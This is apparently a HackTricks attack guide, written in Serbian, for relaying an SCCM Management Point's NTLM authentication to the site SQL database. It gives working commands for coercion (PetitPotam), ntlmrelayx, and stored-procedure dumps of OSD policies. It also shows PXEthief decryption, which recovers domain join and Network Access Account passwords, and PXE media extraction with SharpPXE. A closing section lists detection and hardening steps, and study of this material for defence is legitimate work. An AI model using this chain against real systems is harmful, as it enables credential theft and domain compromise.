# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## Sažetak
Primoravanjem **System Center Configuration Manager (SCCM) Management Point (MP)** da se autentifikuje preko SMB/RPC i **relay-ovanjem** tog NTLM machine account-a na **site database (MSSQL)** dobijate prava `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ove role vam omogućavaju pozivanje niza stored procedura koje izlažu **Operating System Deployment (OSD)** policy blob-ove (Network Access Account kredencijale, Task-Sequence varijable, itd.). Blob-ovi su hex-kodovani/enkriptovani, ali se mogu dekodirati i dekriptovati uz pomoć **PXEthief**, vraćajući plaintext tajne.

Pregled lanca:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Tajne poput `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, itd. se dobijaju bez diranja PXE-a ili klijenata.

---

## 1. Enumerisanje neautentifikovanih MP endpoint-a
MP ISAPI ekstenzija **GetAuth.dll** izlaže nekoliko parametara koji ne zahtevaju autentifikaciju (osim ako je sajt samo PKI):

| Parametar | Svrha |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Vraća javni ključ sertifikata za potpisivanje sajta + GUID-ove *x86* / *x64* **All Unknown Computers** uređaja. |
| `MPLIST` | Navodi svaki Management-Point u site-u. |
| `SITESIGNCERT` | Vraća Primary-Site potpisni sertifikat (omogućava identifikovanje site servera bez LDAP-a). |

Uzmite GUID-ove koji će služiti kao **clientID** za kasnije DB upite:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay MP mašinskog naloga na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Kada se coercion pokrene, trebalo bi da vidite nešto ovako:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifikujte OSD politike putem stored procedures
Povežite se preko SOCKS proxy (port 1080 po defaultu):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Pređite na bazu podataka **CM_<SiteCode>** (koristite trocifreni kod lokacije, npr. `CM_001`).

### 3.1  Pronađite Unknown-Computer GUID-ove (opciono)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lista dodeljenih politika
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Svaki red sadrži `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Fokusirajte se na politike:
* **NAAConfig**  – kredencijali Network Access Account-a
* **TS_Sequence** – varijable Task Sequence-a (OSDJoinAccount/Password)
* **CollectionSettings** – može sadržati run-as accounts

### 3.3  Preuzimanje pune vrednosti Body
Ako već imate `PolicyID` & `PolicyVersion` možete preskočiti zahtev za clientID koristeći:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> VAŽNO: U SSMS-u povećajte “Maximum Characters Retrieved” (>65535) ili će blob biti skraćen.

---

## 4. Dekodirajte i dešifrujte blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Primer oporavljenih tajni:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL uloge i procedure
Pri relay-u, login se mapira na:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ove role otkrivaju desetine EXEC permisija, ključne koje se koriste u ovom napadu su:

| Skladištena procedura | Svrha |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Prikazuje politike primenjene na `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Vraća kompletno telo politike. |
| `MP_GetListOfMPsInSiteOSD` | Vraćeno putem `MPKEYINFORMATIONMEDIA` putanje. |

Puni spisak možete pregledati pomoću:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE: prikupljanje boot medija (SharpPXE)
* **PXE reply over UDP/4011**: pošaljite PXE boot zahtev Distribution Point-u podešenom za PXE. proxyDHCP odgovor otkriva putanje za boot kao što su `SMSBoot\\x64\\pxe\\variables.dat` (šifrovana konfiguracija) i `SMSBoot\\x64\\pxe\\boot.bcd`, plus opciono šifrovani blob ključa.
* **Retrieve boot artifacts via TFTP**: koristite vraćene putanje da preuzmete `variables.dat` preko TFTP (neautentifikovano). Datoteka je mala (nekoliko KB) i sadrži šifrovane media promenljive.
* **Decrypt or crack**:
- Ako odgovor sadrži dekripcioni ključ, ubacite ga u **SharpPXE** da direktno dekriptujete `variables.dat`.
- Ako ključ nije dostavljen (PXE media zaštićena prilagođenom lozinkom), SharpPXE generiše **Hashcat-compatible** `$sccm$aes128$...` hash za offline cracking. Nakon vraćanja lozinke, dekriptujte datoteku.
* **Parse decrypted XML**: plaintext promenljive sadrže SCCM deployment metapodatke (**Management Point URL**, **Site Code**, GUID-ove medija i druge identifikatore). SharpPXE ih parsira i ispisuje spremnu **SharpSCCM** komandu sa GUID/PFX/site parametrima unapred popunjenim za dalju zloupotrebu.
* **Requirements**: potrebna je samo mrežna dohvatljivost PXE listener-a (UDP/4011) i TFTP; lokalne administratorske privilegije nisu potrebne.

---

## 7. Detekcija i hardening
1. **Monitor MP logins** – svaki MP computer account koji se prijavi sa IP adrese koja nije njegov host ≈ relay.
2. Omogućite **Extended Protection for Authentication (EPA)** na site bazi podataka (`PREVENT-14`).
3. Onemogućite neiskorišćeni NTLM, obavezno omogućite SMB signing, ograničite RPC (iste mitigacije koje se koriste protiv `PetitPotam`/`PrinterBug`).
4. Ojačajte MP ↔ DB komunikaciju koristeći IPSec / mutual-TLS.
5. **Constrain PXE exposure** – ograničite UDP/4011 i TFTP na pouzdane VLAN-ove, zahtevajte PXE lozinke i podižite upozorenja pri TFTP preuzimanjima `SMSBoot\\*\\pxe\\variables.dat`.

---

## Vidi takođe
* Osnove NTLM relay-a:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Zloupotreba MSSQL i post-eksploatacija:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Reference
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
